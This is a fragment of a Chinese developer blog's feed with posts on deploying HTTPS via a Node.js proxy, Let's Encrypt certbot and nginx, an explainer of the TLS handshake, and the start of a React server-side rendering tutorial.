class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy'</span>).createProxyServer(&#123;&#125;);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    key: fs.readFileSync(<span class="string">'./keys/server.key'</span>),</span><br><span class="line">    cert: fs.readFileSync(<span class="string">'./keys/server.crt'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = https.createServer(options,(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> host = req.headers.host,</span><br><span class="line">        ip = req.headers[<span class="string">'x-forwarded-for'</span>] || req.connection.remoteAddress;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`client ip: <span class="subst">$&#123;ip&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">switch</span>(host)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'test.localhost'</span>:</span><br><span class="line">            proxy.web(req,res,&#123;</span><br><span class="line">                target: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">                ssl: &#123;</span><br><span class="line">                    key: fs.readFileSync(<span class="string">'./keys/server.key'</span>, <span class="string">'utf8'</span>),</span><br><span class="line">                    cert: fs.readFileSync(<span class="string">'./keys/server.crt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            res.writeHead(<span class="number">200</span>);</span><br><span class="line">            res.end(<span class="string">'welcome to node https proxy server'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">443</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'listening'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'https server has been listened at port 8000'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> httpServer = http.createServer(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`the url is <span class="subst">$&#123;req.url&#125;</span>`</span>)</span><br><span class="line">    res.writeHead(<span class="number">301</span>,&#123;</span><br><span class="line">        <span class="string">'Location'</span>: <span class="string">`https://<span class="subst">$&#123;req.headers.host&#125;</span><span class="subst">$&#123;req.url&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.end()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">httpServer.listen(<span class="number">80</span>);</span><br><span class="line">httpServer.on(<span class="string">'listening'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'the http server has been listened at port 80'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> testServer = http.createServer(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(fs.readFileSync(<span class="string">'./index.html'</span>));</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br><span class="line">testServer.on(<span class="string">'listening'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'the test server has been listened at port 3000'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>将我们的CA证书加入客户端受信任CA证书列表，再访问看看：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/localhostresult.jpg" alt="nice"><br>可爱的小绿锁！</p><p>自己充当CA虽然快捷方便，但是客户端并没有信任该CA证书，还得让客户端将你的CA导入才行。这是很伤感的。</p><h1 id="使用Let’s-Encrypt免费证书"><a href="#使用Let’s-Encrypt免费证书" class="headerlink" title="使用Let’s Encrypt免费证书"></a>使用Let’s Encrypt免费证书</h1><p>Let’s Encrypt是一个开源免费的公钥证书颁发机构，为了促进web https化进程而生。**</p><p>**我这里的环境Centos6 + Nginx</p><h3 id="安装certbot"><a href="#安装certbot" class="headerlink" title="安装certbot"></a>安装certbot</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dl.eff.org/certbot-auto</span><br><span class="line">$ chmod a+x certbot-auto</span><br><span class="line">$ ./certbot-auto</span><br></pre></td></tr></table></figure><h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>Let’s Encrypt自助进行颁发证书，需要验证域名所属权限，在申请证书时，Cerbot会在服务器生成随机文件，然后Cerbot服务器会来尝试访问这个随机文件，以此来验证。</p><p>在nginx监听80端口且代理了将要申请证书的域名的server里加匹配路由：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /.well-known/acme-challenge/ &#123;</span><br><span class="line">    default_type &quot;text/plain&quot;;</span><br><span class="line">    root /usr/local/webserver/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /.well-known/acme-challenge/ &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接着要根据自己的配置在相应目录下新建 <strong>.well-known/acme-challenge/</strong>目录</p><p>如这里的<strong>/usr/local/webserver/nginx/html/.well-known/acme-challenge/</strong></p><p>重启nginx</p><h3 id="申请免费证书"><a href="#申请免费证书" class="headerlink" title="申请免费证书"></a>申请免费证书</h3><p>这里我拿自己的一个子域名做测试:<strong>ppt.luoxia.me</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot certonly --webroot -w /usr/local/webserver/nginx/html/ -d ppt.luoxia.me</span><br></pre></td></tr></table></figure></p><p><strong>申请成功</strong><br><img src="http://7xsi10.com1.z0.glb.clouddn.com/okla.jpg" alt="okla"></p><p>另外注意一个问题，由于Centos 6自带的Python版本是2.6.6，Cerbot不支持，需要升级Python,另外，在申请过程中老是报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No matching distribution found for acme==0.12.0</span><br></pre></td></tr></table></figure></p><p>原因是我的阿里云主机里pip是阿里源，解决办法，修改pip源就好了。</p><h3 id="更新证书"><a href="#更新证书" class="headerlink" title="更新证书"></a>更新证书</h3><p>申请的免费证书有效期为90天，可以进行更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto renew --dry-run</span><br></pre></td></tr></table></figure></p><h1 id="Nginx-server-https部署"><a href="#Nginx-server-https部署" class="headerlink" title="Nginx  server https部署"></a>Nginx  server https部署</h1><p>原理和Node server类似</p><h3 id="https-gt-http的反向代理"><a href="#https-gt-http的反向代理" class="headerlink" title="https -&gt; http的反向代理"></a>https -&gt; http的反向代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">upstream ppt &#123;</span><br><span class="line">    server  localhost:3000;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen  443 ssl;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/ppt.luoxia.me/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/ppt.luoxia.me/privkey.pem;</span><br><span class="line">    ssl_trusted_certificate /etc/letsencrypt/live/ppt.luoxia.me/chain.pem;</span><br><span class="line"></span><br><span class="line">    server_name ppt.luoxia.me;</span><br><span class="line">    location ^~ /.well-known/acme-challenge/ &#123;</span><br><span class="line">            default_type &quot;text/plain&quot;;</span><br><span class="line">            root     /usr/local/webserver/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    location = /.well-known/acme-challenge/ &#123;</span><br><span class="line">            return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-NginX-Proxy true;</span><br><span class="line">        proxy_pass http://ppt/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中ssl_trusted_certificate用于开启OCSP。</p><h3 id="http服务重定向到https"><a href="#http服务重定向到https" class="headerlink" title="http服务重定向到https"></a>http服务重定向到https</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name ppt.luoxia.me;</span><br><span class="line">    rewrite ^(.*)$  https://$host$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署成功,可爱的小绿锁。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/httpsnice.jpg" alt="nice https"></p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>博客网站托管在github主机上的，所以暂时没法给自己的博客域名升级到https，在移动端访问会被流氓的运营商加广告，找个机会将博客迁移到自己的主机上。</p><p>后面还会有不定期的https系列分享，欢迎大家一起讨论。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迁移到HTTPS已经成为必然，许多API已经必须部署HTTPS才能使用，如我之前分享过的WebRTC等，ios已经强制app使用HTTPS,HTTP2.0必须基于HTTPS之上。。。&lt;/p&gt;
&lt;p&gt;那么这篇文章分享下HTTPS系列之实战部署，从Node server和Nginx Server两种情景来分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://luoxia.me/code/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="HTTPS" scheme="http://luoxia.me/code/tags/HTTPS/"/>
    
      <category term="TLS" scheme="http://luoxia.me/code/tags/TLS/"/>
    
      <category term="Web安全" scheme="http://luoxia.me/code/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TLS/SSL原理浅析</title>
    <link href="http://luoxia.me/code/2017/03/09/TLS%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <id>http://luoxia.me/code/2017/03/09/TLS原理浅析/</id>
    <published>2017-03-09T08:40:19.000Z</published>
    <updated>2017-11-16T13:10:06.486Z</updated>
    
    <content type="html"><![CDATA[<p>做人做事，安全很重要，这纷繁复杂的Web世界亦如此。你肯定不希望你在网络上的通讯被别人窥探，篡改。</p><p>SSL/TLS正是担负保护我们传输数据的角色。在这里分享我关于HTTPS有关学习总结，系列包括原理分析，实战部署，安全问题等。<br><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg" alt="">(图片来源网络)<br><a id="more"></a></p><h1 id="从宏观来看TLS协议"><a href="#从宏观来看TLS协议" class="headerlink" title="从宏观来看TLS协议"></a>从宏观来看TLS协议</h1><h3 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h3><p>TLS/SSL传输层安全协议位于OSI七层模型中的表示层，用于数据表示，转换和加密。下层为TCP/IP层，上层通过ALPN(应用层协议协商)扩展建立不同的应用层协议。</p><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>TLS由记录协议实现（record protocol)实现，其上又有四个子协议： 握手协议（handshake protocol),密钥规格变更协议(change cipher spec protocol),应用数据协议(application data protocol)和警报协议(alert protocol)</p><ol><li>记录协议保证数据的完整性和安全性（MAC和加密)</li><li>握手协议保证身份验证</li></ol><h1 id="数字签名原理"><a href="#数字签名原理" class="headerlink" title="数字签名原理"></a>数字签名原理</h1><p>数字签名可以保证数据的完整性，这在我们后面进行证书验证要用到，这在我们进行数字签名需要用到RSA加密算法（非对称加密）</p><p>假设两个同学A,B，A要发送文件给B:</p><p>A用散列函数算法计算file的hash值如SHA256算法，可以保证不同的文档不一样的hash值，加入一些元素据（如哈希算法）进行编码，然后用自己的私钥进行加密编码数据，形成数字签名，加入到file中，发送给B。</p><p>B收到file后，用相同hash算法计算文件的hash值，用A的公钥解密，解码得到文档中的hash值，将两个hash值进行对比，如果两者相同，就能’确认’file来自A且没有经过更改。</p><p>可见这种签名方法结合了hash和RSA用私钥加密数据的方式。</p><p>但是这里还有一个问题，B如何确保得到的公钥是来自A的？这就是我们后面要讲的公钥证书(certificate)了。</p><h1 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h1><p>身份验证用来保证数据发送给指定的目标了，这个和TSL握手协议中的密钥交换部分紧密联系。</p><p>身份验证主要用RSA算法，还是上面的A,B，A发送数据给B,A为了保证将数据发送给B,A用B的公钥加密数据，然后B拿到后用自己的私钥解密。这样就相当于身份验证了。但是RSA有个问题就是前向保密性问题，如果B的私钥被别人获取，那么A和B之前所有的交流都透露出去了。所以我们在进行密钥交换时，一般用DH方式，采用ECDH Params和RSA结合的方式。</p><h1 id="握手协议过程详解"><a href="#握手协议过程详解" class="headerlink" title="握手协议过程详解"></a>握手协议过程详解</h1><p>这里以我对github抓包数据为例进行分析。</p><h3 id="ClientHello"><a href="#ClientHello" class="headerlink" title="ClientHello"></a>ClientHello</h3><p>客户端将功能和首选项发送给服务器，如协议版本，随机数（客户端Random,这个会用于后面生成premaster key 即预主钥)，Session ID可以用于恢复会话，Cipher Suites表示能够接受的密码套件，Compression压缩，Extensions扩展</p><p>抓包：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/client.jpg" alt="clientHello"><br>第一次Session ID为空表明客户端不想恢复之前的会话</p><h3 id="ServerHello"><a href="#ServerHello" class="headerlink" title="ServerHello"></a>ServerHello</h3><p>服务器选择一些参数，返回给客户端，如选择的密码套件，扩展，另外还要发送Random(服务端random,与上面的client random都要参与生成预密钥)<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/serverSayHello.jpg" alt="serverHello"></p><p>我们可以看到SessionTickets扩展（可以用于恢复会话）和ALPN扩展（之前提过），图中还可以看到这次握手选择的套件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</span><br></pre></td></tr></table></figure></p><p>表示使用ECDHE密钥交换方式，用RSA算法进行身份验证，AES加密算法用于对称加密，128表示加密强度，GCM表示加密模式，SHA256用于生成MAC或PRF</p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>服务器发送自己的证书。证书可以用于服务端和客户端的相互验证，然后提供服务端的publick key给客户端，用于后面密钥交换的身份验证工具。</p><p><strong>我们来看看客户端拿到证书后都干了什么：</strong></p><ol><li><p>客户端存有证书颁发机构（CA）的公钥，然后这个证书会经过CA签名（就是在上面我讲的数字签名），客户端用CA的公钥解密证书，确保证书来自该CA</p></li><li><p>从解密的证书中拿到服务端的公钥，客户端用这个公钥去解密证书，如果解密成功，说明这个证书是指定服务端发过来的。</p></li></ol><h3 id="ServerkeyExchange"><a href="#ServerkeyExchange" class="headerlink" title="ServerkeyExchange"></a>ServerkeyExchange</h3><p>服务端发送用于密钥交换的额外数据，如选择DH交换算法时，这个阶段会带上DH Server Params,如文章首页图所示一样。</p><h3 id="ServerHelloDone"><a href="#ServerHelloDone" class="headerlink" title="ServerHelloDone"></a>ServerHelloDone</h3><p>服务端表明握手信息发送结束。</p><p><strong>上面的三个Certificate,ServerkeyExchange,ServerHelloDone实际上是一次性发送的</strong></p><h3 id="ClientKeyExchange"><a href="#ClientKeyExchange" class="headerlink" title="ClientKeyExchange"></a>ClientKeyExchange</h3><p>客户端发送密钥交换所需要的客户端信息，如ECDH交换算法中，会携带DH Client Params,如文章首页图所示。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/clientExchange.jpg" alt="clientExchange"></p><p><strong>在这里我们来分析密钥交换的具体过程（这里以ECDH交换方式为例）：</strong></p><ol><li>服务端在SeverKeyExchange中包含了后面会用到的DH Server Params</li><li><p>客户端在验证服务端的证书后，发送DH Client Params</p></li><li><p>这个时候客户端和服务端都有了两个DH Params,就可以生成Premaster secret了</p></li><li><p>两端使用DH Params加上两个随机数（两个Hello发送的Random)，就可以生成master secret了</p></li><li><p>两端再根据master secret加上两个随机数就可以生成Key了</p></li></ol><p>主密钥生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master_secret = PRF(premaster,&quot;master secret&quot;,ClientHello.random,ServerHello.random)</span><br></pre></td></tr></table></figure></p><p>最终Key生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key_blok = PRF(master_secret, &quot;key expansion&quot;,server_random+client_random)</span><br></pre></td></tr></table></figure></p><p>nice!</p><h3 id="ChangeCipherSpec"><a href="#ChangeCipherSpec" class="headerlink" title="ChangeCipherSpec"></a>ChangeCipherSpec</h3><p>表明已经生成Key，客户端和服务端在生成好密钥后，就可以开始使用对称加密技术用生成的Key进行加密传输数据了。</p><h1 id="其他细节"><a href="#其他细节" class="headerlink" title="其他细节"></a>其他细节</h1><h3 id="服务端要求客户端身份验证"><a href="#服务端要求客户端身份验证" class="headerlink" title="服务端要求客户端身份验证"></a>服务端要求客户端身份验证</h3><p>再ServerKeyExchange后再发送CertificateRequest请求，客户端就得和server一样发送自己的证书</p><h3 id="会话恢复"><a href="#会话恢复" class="headerlink" title="会话恢复"></a>会话恢复</h3><p><strong>Session ID</strong><br>之前在ClientHello提到的Session ID派上用场了，首次握手它是空的，表明不想恢复之前的会话，之后的握手，可以将Session ID放如Session ID参数，如果服务端愿意恢复，就带上相同的Session ID,然后使用之前协商的主密钥生成新的Key,再进行加密传输数据。</p><p><strong>session ticket</strong><br>作为一种扩展引入的一种新的会话恢复机制。<br>服务器取出所有会话数据进行加密，以票证方式返回客户端，接下来客户端将票证提交回server验证解密来恢复会话。但是规格也允许客户端像上面一样发送Session ID,服务端还是的回复同样的值。</p><p>我们在第一次访问github后不久再去访问看看，抓包：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/sessionID.jpg" alt="sessionID"></p><p>会发现后面握手就简单的几步：ClientHello, ServerHello,Server标识完成，Client标识完成</p><p>会话恢复可以减少时间，减少资源消耗。</p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>文章是我结合一些文章和书籍和自己的理解后总结的，欢迎讨论。接下来还会从实战部署，安全问题等方面进一步总结HTTPS。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>数字签名:<a href="http://www.youdzone.com/signature.html" target="_blank" rel="noopener">http://www.youdzone.com/signature.html</a></p><p>TLS握手: <a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener">https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做人做事，安全很重要，这纷繁复杂的Web世界亦如此。你肯定不希望你在网络上的通讯被别人窥探，篡改。&lt;/p&gt;
&lt;p&gt;SSL/TLS正是担负保护我们传输数据的角色。在这里分享我关于HTTPS有关学习总结，系列包括原理分析，实战部署，安全问题等。&lt;br&gt;&lt;img src=&quot;https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg&quot; alt=&quot;&quot;&gt;(图片来源网络)&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://luoxia.me/code/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="HTTPS" scheme="http://luoxia.me/code/tags/HTTPS/"/>
    
      <category term="TLS" scheme="http://luoxia.me/code/tags/TLS/"/>
    
      <category term="Web安全" scheme="http://luoxia.me/code/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>使用React SSR构建Isomorphic应用</title>
    <link href="http://luoxia.me/code/2017/02/07/%E4%BD%BF%E7%94%A8React%20SSR%E6%9E%84%E5%BB%BAIsomorphic%E5%BA%94%E7%94%A8/"/>
    <id>http://luoxia.me/code/2017/02/07/使用React SSR构建Isomorphic应用/</id>
    <published>2017-02-07T09:18:56.000Z</published>
    <updated>2017-11-16T13:10:06.490Z</updated>
    
    <content type="html"><![CDATA[<p>所谓Isomorphic应用即为前后端共用代码的同构应用。与之对应的还有Universal应用，得益于virtual DOM，使得同一套js代码可以运行在各个环境如web, 安卓/IOS,桌面应用等。</p><p>为什么要同构？SPA大大改善了用户体验，但是也存在一些问题，如SEO,首屏渲染效率问题。于是就有一种方案便是SSR即服务端渲染。如React的SSR,通过在server端获取初始state,返回已经含有数据的DOM结构，再交给客户端实例化React，之后客户端接手路由渲染任务，而这一部分能够共用一套代码再好不过了。</p><p>文章以我的实际项目为例，分析整个应用的技术架构，总结一系列问题如服务端渲染组件时的静态资源问题等。</p><p>项目运用React,redux,react-router,React SSR, express,mongoose, Ant design, webpack技术栈，欢迎star:<a href="https://github.com/laoqiren/isomorphic-redux-forum" target="_blank" rel="noopener">https://github.com/laoqiren/isomorphic-redux-forum</a></p><a id="more"></a><h2 id="React-SSR的好处"><a href="#React-SSR的好处" class="headerlink" title="React SSR的好处"></a>React SSR的好处</h2><ol><li>利于SEO：React服务器渲染的方案使你的页面在一开始就有一个HTML DOM结构，方便Google等搜索引擎的爬虫能爬到网页的内容。</li><li>提高首屏渲染的速度：服务器直接返回一个填满数据的HTML，而不是在请求了HTML后还需要异步请求首屏数据</li><li>前后端都共用代码，提供开发效率</li><li>摒弃Template,以组件方式组织代码</li></ol><h2 id="React-SSR提供的API"><a href="#React-SSR提供的API" class="headerlink" title="React SSR提供的API"></a>React SSR提供的API</h2><p>React SSR提供了一些API,可以和React-router, Redux进行配合，渲染首屏.</p><h3 id="renderToString-和-renderToStaticMarkup方法用于将Virtual-DOM渲染成HTML字符串"><a href="#renderToString-和-renderToStaticMarkup方法用于将Virtual-DOM渲染成HTML字符串" class="headerlink" title="renderToString 和 renderToStaticMarkup方法用于将Virtual DOM渲染成HTML字符串"></a>renderToString 和 renderToStaticMarkup方法用于将Virtual DOM渲染成HTML字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;renderToString&#125; <span class="keyword">from</span> <span class="string">'react-dom/server'</span>;</span><br><span class="line"><span class="keyword">const</span> html = renderToString(</span><br><span class="line">            &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">                &lt;RouterContext &#123;...renderProps&#125;/&gt;</span><br><span class="line">            &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br></pre></td></tr></table></figure><p>renderToString：将React Component转化为HTML字符串，生成的HTML的DOM会带有额外属性：各个DOM会有data-react-id属性，第一个DOM会有data-checksum属性。</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/WBPD@L8EK306G~EE%7D4~AS%5BO.png" alt="图1"></p><p>renderToStaticMarkup：同样是将React Component转化为HTML字符串，但是生成HTML的DOM不会有额外属性，从而节省HTML字符串的大小。</p><h3 id="渲染原理"><a href="#渲染原理" class="headerlink" title="渲染原理"></a>渲染原理</h3><p>服务端渲染出来的只是静态DOM，还不能使用State, props,事件等，必须在客户端实例化React,而在客户端渲染之前会根据DOM结果和props计算组件的checksum值，然后与服务端渲染结果中的checksum进行比较，如果相同则不会重新渲染该组件，而如果不想同，则会重新渲染，并抛出错误。当没有找到checksum值时，也会重新渲染。</p><p>这里需要注意一个问题，要将renderToString渲染出来的DOM用额外的div包裹起来，不然会导致checksum不同:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"container"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$&#123;html&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="和Redux配合"><a href="#和Redux配合" class="headerlink" title="和Redux配合:"></a>和Redux配合:</h3><p><strong> 服务端Redux做如下工作:</strong></p><p>. 为每次请求创建全新的 Redux store 实例；</p><p>. 按需 dispatch 一些 action；</p><p>. 从 store 中取出 state；</p><p>. 把 state 一同返回给客户端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = storeApp(&#123;&#125;);</span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    store.dispatch(selectAuthor(<span class="string">'all'</span>)),</span><br><span class="line">    store.dispatch(fetchPostsIfNeeded(<span class="string">'all'</span>))</span><br><span class="line">])</span><br><span class="line">.then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> html = renderToString(</span><br><span class="line">        &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">            &lt;RouterContext &#123;...renderProps&#125;/&gt;</span><br><span class="line">        &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">    const finalState = store.getState();</span></span><br><span class="line"><span class="regexp">    res.end(renderFullPage(html,finalState));</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br></pre></td></tr></table></figure><p>在renderFullPage方法里将初始state挂在window上，方便客户端渲染用:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.__INITIAL_STATE__ = $&#123;<span class="built_in">JSON</span>.stringify(initState)&#125;</span><br></pre></td></tr></table></figure><p><strong>客户端:</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initState = <span class="built_in">window</span>.__INITIAL_STATE__;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = storeApp(initState);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">       &lt;Router history=&#123;browserHistory&#125;&gt;</span><br><span class="line">        &#123;routesApp&#125;</span><br><span class="line">       &lt;<span class="regexp">/Router&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>));</span><br></pre></td></tr></table></figure></p><h3 id="与React-router配合"><a href="#与React-router配合" class="headerlink" title="与React-router配合:"></a>与React-router配合:</h3><p>使用match方法匹配路由，使用RouterContext渲染路由组件</p><p>路由组件生成: routes.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 